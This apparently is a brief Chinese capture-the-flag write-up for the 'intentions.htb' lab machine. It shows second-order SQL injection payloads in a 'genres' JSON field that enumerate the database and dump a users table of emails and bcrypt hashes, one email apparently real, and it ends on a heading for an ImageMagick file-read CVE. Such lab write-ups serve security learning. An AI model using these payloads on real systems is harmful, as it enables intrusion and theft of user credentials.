# 信息枚举

nmap

```
22,80
```

web页面随便创建个用户，登录以后选择感兴趣的图片的地方存在二次注入

```
{"genres":",')/**/union/**/select/**/1,database(),3,4,5#"}
```

```
{"genres":",')/**/union/**/select/**/1,group_concat(table_name),3,4,5/**/from/**/information_schema.tables/**/where/**/table_schema=database()#"}
表名
gallery_images,personal_access_tokens,migrations,users"
```

```
{"genres":",')/**/union/**/select/**/1,group_concat(column_name),3,4,5/**/from/**/information_schema.columns/**/where/**/table_name='users'#"}
列名
id,name,email,password,created_at,updated_at,admin,genres",
```

```
steve~steve@intentions.htb~$2y$10$M\/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa~1,greg~greg@intentions.htb~$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m~1,Melisa Runolfsson~hettie.rutherford@example.org~$2y$10$bymjBxAEluQZEc1O7r1h3OdmlHJpTFJ6CqL1x2ZfQ3paSf509bUJ6~0,Camren Ullrich~nader.alva@example.org~$2y$10$WkBf7NFjzE5GI5SP7hB5\/uA9Bi\/BmoNFIUfhBye4gUql\/JIc\/GTE2~0,Mr. Lucius Towne I~jones.laury@example.com~$2y$10$JembrsnTWIgDZH3vFo1qT.Zf\/hbphiPj1vGdVMXCk56icvD6mn\/ae~0,Jasen Mosciski~wanda93@example.org~$2y$10$oKGH6f8KdEblk6hzkqa2meqyDeiy5gOSSfMeygzoFJ9d1eqgiD2rW~0,Monique D'Amore~mwisoky@example.org~$2y$10$pAMvp3xPODhnm38lnbwPYuZN0B\/0nnHyTSMf1pbEoz6Ghjq.ecA7.~0,Desmond Greenfelder~lura.zieme@example.org~$2y$10$.VfxnlYhad5YPvanmSt3L.5tGaTa4\/dXv1jnfBVCpaR2h.SDDioy2~0,Mrs. Roxanne Raynor~pouros.marcus@example.net~$2y$10$UD1HYmPNuqsWXwhyXSW2d.CawOv1C8QZknUBRgg3\/Kx82hjqbJFMO~0,Rose Rutherford~mellie.okon@example.com~$2y$10$4nxh9pJV0HmqEdq9sKRjKuHshmloVH1eH0mSBMzfzx\/kpO\/XcKw1m~0,Dr. Chelsie Greenholt I~trace94@example.net~$2y$10$by.sn.tdh2V1swiDijAZpe1bUpfQr6ZjNUIkug8LSdR2ZVdS9bR7W~0,Prof. Johanna Ullrich MD~kayleigh18@example.com~$2y$10$9Yf1zb0jwxqeSnzS9CymsevVGLWIDYI4fQRF5704bMN8Vd4vkvvHi~0,Prof. Gina Brekke~tdach@example.com~$2y$10$UnvH8xiHiZa.wryeO1O5IuARzkwbFogWqE7x74O1we9HYspsv9b2.~0,Jarrett Bayer~lindsey.muller@example.org~$2y$10$yUpaabSbUpbfNIDzvXUrn.1O8I6LbxuK63GqzrWOyEt8DRd0ljyKS~0,Macy Walter~tschmidt@example.org~$2y$10$01SOJhuW9WzULsWQHspsde3vVKt6VwNADSWY45Ji33lKn7sSvIxIm~0,Prof. Devan Ortiz DDS~murray.marilie@example.com~$2y$10$I7I4W5pfcLwu3O\/wJwAeJ.xqukO924Tx6WHz1am.PtEXFiFhZUd9S~0,Eula Shields~barbara.goodwin@example.com~$2y$10$0fkHzVJ7paAx0rYErFAtA.2MpKY\/ny1.kp\/qFzU22t0aBNJHEMkg2~0,Mariano Corwin~maggio.lonny@example.org~$2y$10$p.QL52DVRRHvSM121QCIFOJnAHuVPG5gJDB\/N2\/lf76YTn1FQGiya~0,Madisyn Reinger DDS~chackett@example.org~$2y$10$GDyg.hs4VqBhGlCBFb5dDO6Y0bwb87CPmgFLubYEdHLDXZVyn3lUW~0,Jayson Strosin~layla.swift@example.net~$2y$10$Gy9v3MDkk5cWO40.H6sJ5uwYJCAlzxf\/OhpXbkklsHoLdA8aVt3Ei~0,Zelda Jenkins~rshanahan@example.net~$2y$10$\/2wLaoWygrWELes242Cq6Ol3UUx5MmZ31Eqq91Kgm2O8S.39cv9L2~0,Eugene Okuneva I~shyatt@example.com~$2y$10$k\/yUU3iPYEvQRBetaF6GpuxAwapReAPUU8Kd1C0Iygu.JQ\/Cllvgy~0,Mrs. Rhianna Hahn DDS~sierra.russel@example.com~$2y$10$0aYgz4DMuXe1gm5\/aT.gTe0kgiEKO1xf\/7ank4EW1s6ISt1Khs8Ma~0,Viola Vandervort DVM~ferry.erling@example.com~$2y$10$iGDL\/XqpsqG.uu875Sp2XOaczC6A3GfO5eOz1kL1k5GMVZMipZPpa~0,Prof. Margret Von Jr.~beryl68@example.org~$2y$10$stXFuM4ct\/eKhUfu09JCVOXCTOQLhDQ4CFjlIstypyRUGazqmNpCa~0,Florence Crona~ellie.moore@example.net~$2y$10$NDW.r.M5zfl8yDT6rJTcjemJb0YzrJ6gl6tN.iohUugld3EZQZkQy~0,Tod Casper~littel.blair@example.org~$2y$10$S5pjACbhVo9SGO4Be8hQY.Rn87sg10BTQErH3tChanxipQOe9l7Ou~0,liaominkai~1158823151@qq.com~$2y$10$9ltA.SFf\/\/rJ8yV66FXapuTuguqFR3P0bxcxxJ7sUFipQuEV64q2y~0
```

# cve-2022-44268 imagemagick任意文件读取